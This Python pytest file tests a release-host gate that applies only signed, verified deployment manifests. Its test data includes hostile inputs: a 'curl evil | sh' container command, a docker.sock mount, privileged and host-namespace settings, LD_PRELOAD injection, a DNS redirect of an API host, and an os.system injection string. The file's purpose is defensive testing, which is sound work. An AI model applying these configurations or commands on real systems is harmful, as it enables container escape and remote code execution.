"""Host release entry (G1): the production host applies only a manifest it verified against its own clone, through
the existing deploy driver, and nothing else. Real git repositories, throwaway keys, a stand-in for the driver run."""
import gzip
import hashlib
import io
import json
import os
import shutil
import re
import tarfile
from datetime import timedelta
from pathlib import Path

import pytest

from app import release_gateway as rg, release_host as host
from tests.test_release_gateway import Production, configs, images
from tests.test_release_gateway_service import NOW, World, sh

# World is a class, never None: the old `World is None` guard never skipped, so the Stage C checks image (no
# ssh-keygen) errored 53 tests (L2 pilot re-measurement, 2026-10-19). Same guard as test_release_gateway_service.
pytestmark = pytest.mark.skipif(not (shutil.which("ssh-keygen") and shutil.which("git")), reason="needs git, ssh-keygen")

DRIVER = ("#!/usr/bin/env bash\nset -e\ncat > x <<'REMOTE'\necho root-side deploy\n"
          + host.DRIVER_HOLDS_IMAGES + "\nREMOTE\necho uploaded\n")


@pytest.fixture
def tmp_path(tmp_path_factory):
    """The host refuses any path below a group/world-writable directory, and Linux puts pytest's tmp_path under
    /tmp (1777). Root each test in a private directory under the first trusted parent instead; never skip."""
    import shutil
    import tempfile
    for parent in (Path.home() / ".cache", Path.home(), Path.cwd()):
        if parent.is_dir() and host.untrusted_path(parent.resolve()) is None:
            base = Path(tempfile.mkdtemp(prefix="release-host-", dir=parent.resolve()))
            yield base
            shutil.rmtree(base, ignore_errors=True)
            return
    pytest.fail("no trusted (non group/world-writable) directory for release-host tests")


@pytest.fixture
def hw(tmp_path, monkeypatch):
    monkeypatch.setattr(host, "RUN_ROOT", tmp_path / "run")             # production pins /run/company-os-deploy
    monkeypatch.setattr(host, "HOST_COMPOSE", tmp_path / "opt-docker-compose.yml")  # production: /opt/company-os
    monkeypatch.setattr(host, "LEDGER", tmp_path / "ledger.json")         # production pins /var/lib/release-host/...
    (tmp_path / "opt-docker-compose.yml").write_text("\n")                 # the base release's compose, untouched
    w = World(tmp_path)
    # The deploy driver ships with the code; the base release already contains it.
    # Every path the driver packs exists in a real release (git archive refuses a missing one, as the driver does).
    shipped = {"scripts/deploy-company-os.sh": DRIVER, "migrations/env.py": "\n", "agents/registry.yaml": "\n",
               "skills/x/SKILL.md": "\n", "tests/test_x.py": "\n", "alembic.ini": "\n", "requirements.txt": "\n",
               "Dockerfile": "\n", "docker-compose.yml": "\n", "docs/PERMANENT_FACTS.md": "\n"}
    w.base = w.commit("driver", **shipped)
    w.push()
    w.cfg.ledger.write_text(json.dumps({"last_sha": w.base, "last_sequence": 6, "seen": [], "min_policy_version": 1,
                                        "images": images(w.base), "configs": configs()}))
    w.report(w.base)
    w.prod = Production(w.base)
    host_clone = tmp_path / "host-clone"
    sh(tmp_path, "git", "clone", "-q", str(w.origin), str(host_clone))
    w.hcfg = host.Config({
        "repository": "seerxo/os", "branch": "main", "clone": str(host_clone), "fetch_url": str(w.origin),
        "policy": str(w.cfg.policy), "policy_sig": str(w.cfg.policy_sig), "founder_key": str(w.cfg.founder_key),
        "ledger": str(w.cfg.ledger), "inboxes": [str(w.cfg.outbox), str(tmp_path / "founder-inbox")],
        "rejected": str(tmp_path / "rejected"), "run_root": str(tmp_path / "run"),
        "identity_report": str(tmp_path / "identity.json")})
    w.runs = []
    w.driver_exit = 0

    def run(env, script):
        d = script.parent
        w.runs.append({"env": env, "script": script.read_text(), "sums": (d / "main.sha256").read_text(),
                       "src": sorted(tarfile.open(fileobj=io.BytesIO(gzip.decompress((d / "src.tgz").read_bytes())))
                                     .getnames())})
        if w.driver_exit == 0:
            w.prod.deploy(env["SHA"])          # the driver really switched api, worker and reasoner
        return w.driver_exit
    w.run = run
    return w


def signed_docs_release(w):
    sha = w.commit("docs", **{"docs/HANDOFF.md": "new\n", "app/main.py": "x = 1\n"})
    w.push()
    out = w.tick()
    assert out["outcome"] == "SIGNED", out
    return sha, out["detail"]


def step(w, **kw):
    return host.step(w.hcfg, now=NOW, run=w.run, observe=w.prod.observe, **kw)


def test_a_gateway_signed_release_is_applied_through_the_existing_driver(hw):
    sha, name = signed_docs_release(hw)
    out = step(hw)
    assert out == {"outcome": "APPLIED", "sha": sha, "sequence": 7, "approver": "gateway"}
    run, = hw.runs
    assert run["env"]["SHA"] == sha and run["env"]["AUTOMATIC"] == "true" and run["env"]["DETACH"] == ""
    assert run["env"]["APPLY"] == "--apply" and run["env"]["ALLOW_MIGRATION"] == ""
    assert run["script"] == "echo root-side deploy\n" + host.DRIVER_HOLDS_IMAGES + "\n"   # its root side at that commit
    assert run["sums"] == rg.payload_listing(hw.hcfg.clone, sha)          # what the driver verifies files against
    assert "app/main.py" in run["src"] and "docs/HANDOFF.md" not in run["src"]   # only the shipped paths
    ledger = json.loads(hw.hcfg.ledger.read_text())
    assert ledger["last_sha"] == sha and ledger["last_sequence"] == 7 and "pending" not in ledger
    assert (hw.cfg.outbox / f"{name}.applied").exists()
    assert step(hw) == {"outcome": "IDLE"}                                  # applied once


def test_a_tampered_manifest_is_rejected_and_nothing_runs(hw):
    sha, name = signed_docs_release(hw)
    path = hw.cfg.outbox / f"{name}.json"
    path.write_bytes(path.read_bytes().replace(b'"sequence":7', b'"sequence":8'))
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "not signed" in out["reason"] and hw.runs == []
    assert (hw.hcfg.rejected / f"{name}.reason").exists() and not path.exists()
    assert json.loads(hw.hcfg.ledger.read_text())["last_sha"] == hw.base


def test_a_missing_signature_is_rejected(hw):
    _, name = signed_docs_release(hw)
    (hw.cfg.outbox / f"{name}.sig").unlink()
    assert step(hw)["outcome"] == "REJECTED" and hw.runs == []


def test_a_failed_deploy_leaves_the_host_pending_until_the_founder_reconciles(hw):
    _, name = signed_docs_release(hw)
    hw.driver_exit = 1
    out = step(hw)
    assert out["outcome"] == "APPLY_FAILED" and len(hw.runs) == 1
    assert json.loads(hw.hcfg.ledger.read_text())["pending"]
    hw.driver_exit = 0
    again = step(hw)
    assert again["outcome"] == "WAITING_FOR_FOUNDER" and len(hw.runs) == 1     # never re-applied by itself
    assert (hw.cfg.outbox / f"{name}.json").exists()                       # kept as evidence, not rejected


def test_a_commit_the_host_has_but_that_left_main_is_rejected(hw):
    sha, name = signed_docs_release(hw)
    sh(hw.hcfg.clone, "git", "fetch", "-q", "origin", "main")               # the host already holds the object
    sh(hw.work, "git", "reset", "-q", "--hard", hw.base)
    sh(hw.work, "git", "push", "-q", "--force", "origin", "main")           # then the signed commit left main
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "another repository or branch" in out["reason"] and hw.runs == []


def test_a_stolen_gateway_key_cannot_understate_the_change_to_ship_high_risk_code(hw):
    # A genuinely reviewed diff that also touches app/, presented by a forged manifest as docs-only.
    sha = hw.commit("mixed", **{"docs/HANDOFF.md": "new\n", "app/main.py": "x = 666\n"})
    hw.push()
    diff = rg.git_release_diff(hw.work, hw.base, sha)
    packet = rg.review_packet("seerxo/os", hw.base, sha, diff, "ef" * 16)
    att = rg.attestation("codex", packet, {"verdict": "APPROVE", "fingerprint": packet["fingerprint"],
                                           "findings": []}, NOW.isoformat())
    digest = rg.payload_digest(rg.payload_listing(hw.work, sha))
    manifest = {"version": 1, "repository": "seerxo/os", "branch": "main", "sha": sha, "parent_sha": hw.base,
                "payload_digest": digest, "changed_paths": ["docs/HANDOFF.md"], "sequence": 7,
                "issued_at": NOW.isoformat(), "expires_at": (NOW + timedelta(hours=1)).isoformat(),
                "policy_version": 1, "migration_to": "", "approver": "gateway",
                "evidence": {"trusted_checks": {"runner": "gateway", "sha": sha, "payload_digest": digest,
                                                "passed": True},
                             "review": {"nonce": "ef" * 16, "attestation": att, "signature": rg.sign(
                                 rg.canonical(att), hw.keys["reviewer"][0], rg.NS_REVIEW)}}}
    raw = rg.canonical(manifest)
    hw.cfg.outbox.mkdir(parents=True, exist_ok=True)
    (hw.cfg.outbox / "000007-forged.json").write_bytes(raw)
    (hw.cfg.outbox / "000007-forged.sig").write_text(rg.sign(raw, hw.keys["gateway"][0], rg.NS_RELEASE))
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "changed paths" in out["reason"] and hw.runs == []


def test_an_expired_manifest_is_rejected(hw):
    signed_docs_release(hw)
    out = host.step(hw.hcfg, now=NOW + timedelta(hours=3), run=hw.run, observe=hw.prod.observe)
    assert out["outcome"] == "REJECTED" and "expired" in out["reason"] and hw.runs == []


def test_a_founder_signed_high_risk_release_from_the_founder_inbox_is_applied(hw):
    sha = hw.commit("risky", **{"app/main.py": "x = 2\n",
                                "migrations/versions/a.py": 'revision = "abcdef012345"\ndown_revision = None\n'})
    hw.push()
    assert hw.tick()["outcome"] == "FOUNDER_REQUIRED"
    draft = json.loads(next(hw.cfg.founder_queue.iterdir()).read_text()) | {"migration_to": "abcdef012345"}
    raw = rg.canonical(draft)
    inbox = hw.tmp / "founder-inbox"
    inbox.mkdir()
    (inbox / "000007.json").write_bytes(raw)
    (inbox / "000007.sig").write_text(rg.sign(raw, hw.keys["founder"][0], rg.NS_RELEASE))
    out = step(hw)
    assert out["outcome"] == "APPLIED" and out["approver"] == "founder" and out["sha"] == sha
    assert hw.runs[0]["env"]["ALLOW_MIGRATION"] == "abcdef012345"


def test_the_gateway_draft_cannot_be_applied_unsigned_or_with_the_gateway_key(hw):
    hw.commit("risky", **{"app/main.py": "x = 2\n"})
    hw.push()
    hw.tick()
    raw = rg.canonical(json.loads(next(hw.cfg.founder_queue.iterdir()).read_text()))
    inbox = hw.tmp / "founder-inbox"
    inbox.mkdir()
    (inbox / "000007.json").write_bytes(raw)
    (inbox / "000007.sig").write_text(rg.sign(raw, hw.keys["gateway"][0], rg.NS_RELEASE))
    assert step(hw)["outcome"] == "REJECTED" and hw.runs == []


# --------------------------------------------------------------------------- production identity on the host

def test_a_legacy_deploy_is_detected_and_blocks_both_host_and_gateway(hw):
    sha, name = signed_docs_release(hw)
    hw.prod.deploy("9" * 40)                                                   # someone deployed outside the gateway
    out = step(hw)
    assert out["outcome"] == "BLOCKED" and "differs from the recorded release" in out["reason"]
    assert hw.runs == [] and (hw.cfg.outbox / f"{name}.json").exists()        # nothing applied, nothing discarded
    report = json.loads(hw.hcfg.identity_report.read_text())
    assert report["ok"] is False
    hw.commit("more docs", **{"docs/other.md": "x\n"})
    hw.push()
    assert hw.tick()["outcome"] == "WAITING"                                   # the gateway reads it and stops


def test_identity_changing_between_the_report_and_the_lock_blocks(hw):
    signed_docs_release(hw)
    calls = []

    def observe():
        calls.append(1)
        if len(calls) > 1:                                                     # after the report, before the apply
            hw.prod.deploy("8" * 40)
        return hw.prod.observe()
    out = host.step(hw.hcfg, now=NOW, run=hw.run, observe=observe)
    assert out["outcome"] == "BLOCKED" and hw.runs == []
    assert "pending" not in json.loads(hw.hcfg.ledger.read_text())


def test_a_driver_that_exits_0_but_did_not_switch_production_leaves_the_host_pending(hw):
    signed_docs_release(hw)
    hw.run_quietly = hw.run

    def lying_driver(env, script):
        hw.runs.append({"env": env})
        return 0                                                               # claims success, changed nothing
    out = host.step(hw.hcfg, now=NOW, run=lying_driver, observe=hw.prod.observe)
    assert out["outcome"] == "APPLY_FAILED" and "after apply" in out["reason"]
    assert json.loads(hw.hcfg.ledger.read_text())["pending"]
    assert step(hw)["outcome"] == "WAITING_FOR_FOUNDER"


def test_founder_bootstrap_and_recovery_commands_on_the_host(hw, tmp_path):
    from tests.test_release_gateway import HOST
    hw.hcfg.ledger.unlink()
    assert step(hw)["outcome"] == "BLOCKED"                                    # no baseline: nothing at all
    praw = hw.hcfg.policy.read_bytes()
    st = {"kind": "bootstrap", "host_id": HOST, "repository": "seerxo/os", "branch": "main", "nonce": "cd" * 16,
          "images": images(hw.base), "configs": configs(), "issued_at": NOW.isoformat(),
          "expires_at": (NOW + timedelta(hours=1)).isoformat(),
          "policy_sha256": __import__("hashlib").sha256(praw).hexdigest(), "release_sha": hw.base}
    raw = rg.canonical(st)
    (tmp_path / "boot.json").write_bytes(raw)
    (tmp_path / "boot.sig").write_text(rg.sign(raw, hw.keys["founder"][0], rg.NS_BOOTSTRAP))
    out = host.founder_statement(hw.hcfg, "bootstrap", tmp_path / "boot.json", tmp_path / "boot.sig", now=NOW,
                                 observe=hw.prod.observe, machine_id=HOST)
    assert out == {"outcome": "BOOTSTRAP_DONE", "last_sha": hw.base}
    assert json.loads(hw.hcfg.identity_report.read_text())["ok"] is True
    with pytest.raises(rg.Refused, match="cannot reset"):
        host.founder_statement(hw.hcfg, "bootstrap", tmp_path / "boot.json", tmp_path / "boot.sig", now=NOW,
                               observe=hw.prod.observe, machine_id=HOST)


def test_the_host_reads_identity_from_docker_inspect_not_tags(monkeypatch):
    import subprocess as sp
    img = "sha256:" + "a" * 64

    infos = {}

    def docker(argv, **kw):
        name = argv[-1]
        info = {"Image": img, "Config": {"Env": ["COMPANY_OS_GIT_SHA=" + "1" * 40, "X=y"],
                                         "Image": f"company-os-{name}:latest", "Cmd": [name]},
                "State": {"Running": True}}
        if name == "company-reasoner":
            info["State"]["Running"] = False                                   # a stopped component is not identity
        infos[name] = info
        return sp.CompletedProcess(argv, 0, stdout=json.dumps(info), stderr="")
    observed = host.observe_production(run=docker)
    assert set(observed) == {"api", "worker"}
    assert observed["api"] == {"image": img, "config": host.security_config(infos["company-api"]), "git_sha": "1" * 40}
    assert observed["api"]["config"] != observed["worker"]["config"]          # another command, another identity
    assert rg.identity_problem(observed, "1" * 40, {c: img for c in rg.COMPONENTS},
                               {c: observed["api"]["config"] for c in rg.COMPONENTS}).startswith("production identity")


BASE_INFO = {
    "Image": "sha256:" + "a" * 64, "State": {"Running": True}, "Mounts": [],
    "Config": {"Env": ["COMPANY_OS_GIT_SHA=" + "1" * 40, "A=1", "B=2"], "Cmd": ["python", "-m", "app.worker"],
               "User": "10001", "Hostname": "c0ffee", "Image": "company-os-worker:latest", "Labels": {"x": "1"}},
    "HostConfig": {"Privileged": False, "CapDrop": ["ALL", "NET_RAW"], "ReadonlyRootfs": True, "NetworkMode": "bridge",
                   "Binds": ["/a:/a:ro", "/b:/b:ro"], "Dns": None},
    "NetworkSettings": {"Networks": {"default": {"IPAddress": "172.18.0.2"}, "internal": {"IPAddress": "10.0.0.2"}}}}

MORE_POWER = {
    "Privileged": lambda i: i["HostConfig"].update(Privileged=True),
    "Binds": lambda i: i["HostConfig"].update(Binds=["/var/run/docker.sock:/var/run/docker.sock"]),
    "mount": lambda i: i["Mounts"].append({"Type": "bind", "Source": "/", "Destination": "/host", "RW": True}),
    "User": lambda i: i["Config"].update(User="0"),
    "Cmd": lambda i: i["Config"].update(Cmd=["sh", "-c", "curl evil | sh"]),
    "Entrypoint": lambda i: i["Config"].update(Entrypoint=["/bin/sh"]),
    "WorkingDir": lambda i: i["Config"].update(WorkingDir="/tmp/evil"),
    "Env": lambda i: i["Config"]["Env"].append("LD_PRELOAD=/tmp/x.so"),
    "Env-PYTHONPATH": lambda i: i["Config"]["Env"].append("PYTHONPATH=/tmp/evil"),
    "CapAdd": lambda i: i["HostConfig"].update(CapAdd=["SYS_ADMIN"]),
    "CapDrop": lambda i: i["HostConfig"].update(CapDrop=["NET_RAW"]),
    "NetworkMode": lambda i: i["HostConfig"].update(NetworkMode="host"),
    "Networks": lambda i: i["NetworkSettings"]["Networks"].update(review_net={}),
    "SecurityOpt": lambda i: i["HostConfig"].update(SecurityOpt=["seccomp=unconfined"]),
    "ReadonlyRootfs": lambda i: i["HostConfig"].update(ReadonlyRootfs=False),
    "PidMode": lambda i: i["HostConfig"].update(PidMode="host"),
    "IpcMode": lambda i: i["HostConfig"].update(IpcMode="host"),
    "UsernsMode": lambda i: i["HostConfig"].update(UsernsMode="host"),
    "UTSMode": lambda i: i["HostConfig"].update(UTSMode="host"),
    "CgroupnsMode": lambda i: i["HostConfig"].update(CgroupnsMode="host"),
    "CgroupParent": lambda i: i["HostConfig"].update(CgroupParent="/"),
    "Devices": lambda i: i["HostConfig"].update(Devices=[{"PathOnHost": "/dev/sda", "PathInContainer": "/dev/sda",
                                                          "CgroupPermissions": "rwm"}]),
    "DeviceCgroupRules": lambda i: i["HostConfig"].update(DeviceCgroupRules=["a *:* rwm"]),
    "DeviceRequests": lambda i: i["HostConfig"].update(DeviceRequests=[{"Driver": "nvidia", "Count": -1}]),
    "Runtime": lambda i: i["HostConfig"].update(Runtime="runc-unsafe"),
    "GroupAdd": lambda i: i["HostConfig"].update(GroupAdd=["docker"]),
    "VolumesFrom": lambda i: i["HostConfig"].update(VolumesFrom=["company-worker"]),
    "Sysctls": lambda i: i["HostConfig"].update(Sysctls={"kernel.core_pattern": "|/tmp/x"}),
    "Tmpfs": lambda i: i["HostConfig"].update(Tmpfs={"/run": "exec"}),
    "ExtraHosts": lambda i: i["HostConfig"].update(ExtraHosts=["api.anthropic.com:6.6.6.6"]),
    "Dns": lambda i: i["HostConfig"].update(Dns=["6.6.6.6"]),
    "PortBindings": lambda i: i["HostConfig"].update(PortBindings={"8000/tcp": [{"HostIp": "0.0.0.0"}]}),
    "MaskedPaths": lambda i: i["HostConfig"].update(MaskedPaths=[]) or i["HostConfig"].update(MaskedPaths=["/proc/kcore"]),
    "Mount-Mode": lambda i: i["Mounts"].append({"Type": "volume", "Destination": "/d", "Mode": "z"}),
    "Mount-source": lambda i: i["Mounts"].append({"Type": "bind", "Source": "/etc", "Destination": "/d"}),
    "Mount-rw": lambda i: i["Mounts"].append({"Type": "bind", "Source": "/x", "Destination": "/d", "RW": True}),
}


def _digest(info):
    return host.security_config(info)


@pytest.mark.parametrize("name", sorted(MORE_POWER))
def test_a_more_powerful_container_from_the_same_image_changes_identity(name):
    import copy
    changed = copy.deepcopy(BASE_INFO)
    MORE_POWER[name](changed)
    assert _digest(changed) != _digest(BASE_INFO), name


def test_mount_fields_each_count():
    import copy
    base = copy.deepcopy(BASE_INFO)
    base["Mounts"] = [{"Type": "bind", "Source": "/x", "Destination": "/d", "RW": False, "Mode": "", "Propagation": "rprivate"}]
    for key, value in (("Source", "/y"), ("RW", True), ("Mode", "z"), ("Destination", "/e"), ("Propagation", "shared")):
        other = copy.deepcopy(base)
        other["Mounts"][0][key] = value
        assert _digest(other) != _digest(base), key


def test_reordering_volatile_and_empty_fields_never_blocks():
    import copy
    same = copy.deepcopy(BASE_INFO)
    same["HostConfig"]["Binds"].reverse()
    same["HostConfig"]["CapDrop"].reverse()
    same["HostConfig"]["Dns"] = []                                         # null vs [] is the same
    same["HostConfig"]["ExtraHosts"] = None
    same["Config"]["Env"] = list(reversed(same["Config"]["Env"]))
    same["Config"]["Hostname"] = "beef00"                                  # container id: volatile
    same["Config"]["Image"] = "company-os-worker:other-tag"                # a tag is never identity
    same["Config"]["Labels"] = {"y": "2"}
    same["NetworkSettings"]["Networks"] = {"internal": {"IPAddress": "10.0.0.9"}, "default": {"IPAddress": "1.1.1.1"}}
    assert _digest(same) == _digest(BASE_INFO)


def test_environment_values_never_appear_in_the_identity(hw):
    import copy
    info = copy.deepcopy(BASE_INFO)
    info["Config"]["Env"].append("SECRET=hunter2-very-secret")
    digest = _digest(info)
    assert "hunter2" not in digest and len(digest) == 64


def test_every_inspect_is_for_a_container():
    import subprocess as sp
    argvs = []

    def run(argv, **kw):
        argvs.append(argv)
        return sp.CompletedProcess(argv, 0, stdout=json.dumps(BASE_INFO), stderr="")
    host.observe_production(run=run)
    assert argvs and all(argv[:4] == ["docker", "inspect", "--type", "container"] for argv in argvs)


def test_a_reconfigured_container_blocks_the_host(hw):
    sha, name = signed_docs_release(hw)
    hw.prod.running["api"]["config"] = "e" * 64
    out = step(hw)
    assert out["outcome"] == "BLOCKED" and "container configuration" in out["reason"] and hw.runs == []
    assert (hw.cfg.outbox / f"{name}.json").exists()


def test_the_ledger_and_identity_report_are_readable_by_the_gateway_group_only(hw):
    # Root writes them; the gateway runs as its own Unix user (H2) and reads them through the directory's group.
    # mkstemp alone makes 0600 files, which would leave the gateway WAITING forever; others get nothing.
    signed_docs_release(hw)
    assert step(hw)["outcome"] == "APPLIED"
    for path in (hw.hcfg.ledger, hw.hcfg.identity_report, rg.history_path(hw.hcfg.ledger)):
        st = path.stat()
        assert st.st_mode & 0o777 == 0o640, path.name
        assert st.st_gid == path.parent.stat().st_gid, path.name


def test_the_identity_report_follows_the_release_and_the_pending_state(hw):
    sha, _ = signed_docs_release(hw)
    assert step(hw)["outcome"] == "APPLIED"
    report = json.loads(hw.hcfg.identity_report.read_text())
    assert report["ok"] is True and report["last_sha"] == sha and report["pending"] is False
    hw.commit("more docs", **{"docs/other.md": "x\n"})
    hw.push()
    hw.report(sha)                                     # the gateway's own fixture report for the new release
    assert hw.tick()["outcome"] == "SIGNED"
    hw.driver_exit = 1
    assert step(hw)["outcome"] == "APPLY_FAILED"
    assert json.loads(hw.hcfg.identity_report.read_text())["pending"] is True


# --------------------------------------------------------------------------- shipped bytes are the hashed bytes

@pytest.mark.parametrize("attributes, files", [
    ("app/x.py export-subst\n", {"app/x.py": "$Format:%s$\n"}),          # commit subject becomes code in src.tgz
    ("app/x.py export-ignore\n", {"app/x.py": "x = 1\n"}),               # a hashed file silently not shipped
])
def test_the_shipped_archive_is_exactly_the_hashed_payload(hw, tmp_path, attributes, files):
    sha = hw.commit("import os; os.system('id')", **{".gitattributes": attributes, **files})
    hw.push()
    sh(hw.hcfg.clone, "git", "fetch", "-q", "origin", "main")
    out = tmp_path / "rel"
    out.mkdir()
    with pytest.raises(RuntimeError, match="differs from the hashed payload"):
        host.build_release(hw.hcfg, sha, out)
    assert not (out / "src.tgz").exists()


def test_a_plain_release_archive_matches_the_hashed_payload(hw, tmp_path):
    out = tmp_path / "rel"
    out.mkdir()
    host.build_release(hw.hcfg, hw.base, out)
    assert (out / "src.tgz").exists() and (out / "main.sha256").read_text() == rg.payload_listing(hw.hcfg.clone, hw.base)


# --------------------------------------------------------------------------- root reads gateway-writable files safely

def test_an_in_flight_dotfile_is_never_picked_up(hw):
    _, name = signed_docs_release(hw)
    for suffix in ("json", "sig"):
        (hw.cfg.outbox / f"{name}.{suffix}").rename(hw.cfg.outbox / f".{name}.{suffix}")
    assert step(hw) == {"outcome": "IDLE"} and hw.runs == []


def test_a_symlinked_manifest_is_rejected_without_reading_its_target(hw, tmp_path):
    _, name = signed_docs_release(hw)
    real = tmp_path / "elsewhere.json"
    (hw.cfg.outbox / f"{name}.json").rename(real)
    (hw.cfg.outbox / f"{name}.json").symlink_to(real)                  # e.g. /dev/zero or a root-only file
    out = step(hw)
    assert out["outcome"] == "IDLE" and hw.runs == [] and real.exists()      # not a regular file: skipped, never moved
    assert (hw.cfg.outbox / f"{name}.json").is_symlink()


def test_an_oversized_manifest_is_rejected_unread(hw):
    _, name = signed_docs_release(hw)
    (hw.cfg.outbox / f"{name}.json").write_bytes(b" " * (host.MAX_INBOX_FILE + 1))
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "at most" in out["reason"] and hw.runs == []


def test_a_planted_reason_symlink_does_not_make_root_write_elsewhere(hw, tmp_path):
    _, name = signed_docs_release(hw)
    (hw.cfg.outbox / f"{name}.sig").unlink()
    victim = tmp_path / "victim"
    victim.write_text("untouched\n")
    hw.hcfg.rejected.mkdir()
    (hw.hcfg.rejected / f"{name}.reason").symlink_to(victim)          # e.g. /etc/cron.d/x
    assert step(hw)["outcome"] == "REJECTED"
    assert victim.read_text() == "untouched\n"
    reason = hw.hcfg.rejected / f"{name}.reason"
    assert not reason.is_symlink() and reason.read_text().startswith(("Refused", "FileNotFoundError"))


@pytest.mark.parametrize("which", ["outbox", "rejected", "run_root"])
def test_a_symlinked_inbox_rejected_or_run_directory_blocks_before_root_touches_it(hw, tmp_path, which):
    # The gateway can write its outbox; if it (or a writable parent) can swap a directory for a symlink, root would
    # glob, move or write inside the link's target (e.g. move /etc/docker/daemon.json into rejected/).
    signed_docs_release(hw)
    victim_dir = tmp_path / "etc-docker"
    victim_dir.mkdir()
    (victim_dir / "daemon.json").write_text('{"sequence": 1}')
    path = {"outbox": hw.cfg.outbox, "rejected": hw.hcfg.rejected, "run_root": hw.hcfg.run_root}[which]
    if path.exists():
        path.rename(tmp_path / f"{which}.real")
    path.symlink_to(victim_dir)
    out = step(hw)
    assert out["outcome"] == "BLOCKED" and "untrusted" in out["reason"] and hw.runs == []
    assert (victim_dir / "daemon.json").read_text() == '{"sequence": 1}' and len(list(victim_dir.iterdir())) == 1


def test_a_group_writable_parent_of_the_rejected_directory_blocks(hw):
    signed_docs_release(hw)
    parent = hw.hcfg.rejected.parent
    mode = parent.stat().st_mode & 0o7777
    parent.chmod(mode | 0o020)
    try:
        out = step(hw)
    finally:
        parent.chmod(mode)
    assert out["outcome"] == "BLOCKED" and "untrusted" in out["reason"] and hw.runs == []


def test_the_ledger_lock_is_root_only_so_a_reader_cannot_stall_the_host(hw):
    # The gateway group may read the ledger, but must not be able to open its lock: whoever can open it can hold
    # LOCK_EX and stall release_transaction, bootstrap and recovery forever.
    lock = hw.hcfg.ledger.with_name(hw.hcfg.ledger.name + ".lock")
    lock.write_text("")
    lock.chmod(0o644)                                     # e.g. left by an older version
    signed_docs_release(hw)
    assert step(hw)["outcome"] == "APPLIED"
    assert lock.stat().st_mode & 0o777 == 0o600


def test_a_symlinked_ledger_lock_is_refused(hw, tmp_path):
    victim = tmp_path / "victim"
    victim.write_text("x")
    victim.chmod(0o644)
    hw.hcfg.ledger.with_name(hw.hcfg.ledger.name + ".lock").symlink_to(victim)
    with pytest.raises(OSError):
        with rg._locked(hw.hcfg.ledger):
            pass
    assert victim.stat().st_mode & 0o777 == 0o644



# --------------------------------------------------------------------------- V3: inbox entries and directories

def test_a_directory_named_like_a_manifest_is_skipped_and_never_wedges_the_queue(hw):
    hw.cfg.outbox.mkdir(parents=True, exist_ok=True)
    junk = hw.cfg.outbox / "000001-x.json"
    junk.mkdir()
    os.mkfifo(hw.cfg.outbox / "000002-f.json")                         # nor a FIFO
    assert step(hw) == {"outcome": "IDLE"}
    assert junk.is_dir() and not hw.hcfg.rejected.exists()             # never moved into root's rejected/
    _, name = signed_docs_release(hw)
    assert step(hw)["outcome"] == "APPLIED"                            # the queue still moves


def test_a_hardlinked_manifest_is_rejected_unread(hw, tmp_path):
    _, name = signed_docs_release(hw)
    path = hw.cfg.outbox / f"{name}.json"
    os.link(path, tmp_path / "second-name")                            # e.g. a link to a root-only file
    out = step(hw)
    assert out["outcome"] == "REJECTED" and "link" in out["reason"] and hw.runs == []


def test_a_hardlinked_low_sequence_entry_does_not_jump_the_queue(hw, tmp_path):
    _, name = signed_docs_release(hw)
    other = tmp_path / "other.json"
    other.write_text(json.dumps({"sequence": 1}))
    os.link(other, hw.cfg.outbox / "000001-h.json")
    assert step(hw)["outcome"] == "APPLIED"                            # unreadable entries sort last


def test_a_symlinked_signature_is_rejected(hw, tmp_path):
    _, name = signed_docs_release(hw)
    sig = hw.cfg.outbox / f"{name}.sig"
    sig.rename(tmp_path / "real.sig")
    sig.symlink_to(tmp_path / "real.sig")
    assert step(hw)["outcome"] == "REJECTED" and hw.runs == []


def test_read_inbox_refuses_a_directory_and_a_fifo_without_hanging(tmp_path):
    import threading
    d = tmp_path / "d.json"
    d.mkdir()
    with pytest.raises(rg.Refused):
        host._read_inbox(d)
    fifo = tmp_path / "f.json"
    os.mkfifo(fifo)
    result = []

    def read():
        try:
            host._read_inbox(fifo)
        except rg.Refused as error:
            result.append(error)
    t = threading.Thread(target=read, daemon=True)
    t.start()
    t.join(5)
    assert result, "reading a FIFO must not block"


def test_read_inbox_checks_the_size_before_reading_and_after(tmp_path, monkeypatch):
    big = tmp_path / "big.json"
    big.write_bytes(b" " * (host.MAX_INBOX_FILE + 1))
    real_read = os.read
    monkeypatch.setattr(host.os, "read", lambda *a: pytest.fail("an oversized file must not be read"))
    with pytest.raises(rg.Refused, match="at most"):
        host._read_inbox(big)
    monkeypatch.setattr(host.os, "read", real_read)
    real_fstat = os.fstat

    def small(fd):                                                   # the file grew after fstat
        info = real_fstat(fd)
        return os.stat_result((info.st_mode, info.st_ino, info.st_dev, 1, info.st_uid, info.st_gid, 10,
                               info.st_atime, info.st_mtime, info.st_ctime))
    monkeypatch.setattr(host.os, "fstat", small)
    with pytest.raises(rg.Refused, match="at most"):
        host._read_inbox(big)


def test_untrusted_path_rules(tmp_path, monkeypatch):
    base = tmp_path / "base"
    base.mkdir(mode=0o755)
    leaf = base / "leaf"
    leaf.mkdir(mode=0o755)
    assert host.untrusted_path(leaf) is None
    assert host.untrusted_path(leaf / "missing" / "deeper") is None   # root creates the tail under a trusted parent
    leaf.chmod(0o775)
    assert "writable" in host.untrusted_path(leaf)                     # the leaf itself is checked (rejected, run_root)
    assert host.untrusted_path(leaf, writable_leaf=True) is None       # an inbox may be gateway-writable
    leaf.chmod(0o755)
    base.chmod(0o757)
    assert "writable" in host.untrusted_path(leaf, writable_leaf=True)  # world-writable parent
    base.chmod(0o755)
    monkeypatch.setattr(host.os, "geteuid", lambda: 4242)              # files owned by neither root nor this euid
    assert "owned by uid" in host.untrusted_path(leaf)


def test_untrusted_rejected_or_run_root_leaf_blocks(hw):
    signed_docs_release(hw)
    hw.hcfg.rejected.mkdir(mode=0o775)
    hw.hcfg.rejected.chmod(0o775)
    out = step(hw)
    assert out["outcome"] == "BLOCKED" and "untrusted" in out["reason"] and hw.runs == []


@pytest.mark.parametrize("which", ["identity_report", "ledger"])
def test_a_symlinked_report_or_ledger_directory_blocks_before_anything_is_written(hw, tmp_path, which):
    victim = tmp_path / "victim"
    victim.mkdir()
    link = tmp_path / "linkdir"
    link.symlink_to(victim)
    if which == "ledger":
        (victim / "ledger.json").write_text(hw.hcfg.ledger.read_text())
    setattr(hw.hcfg, which, link / ("identity.json" if which == "identity_report" else "ledger.json"))
    out = step(hw)
    assert out["outcome"] == "BLOCKED" and "untrusted" in out["reason"]
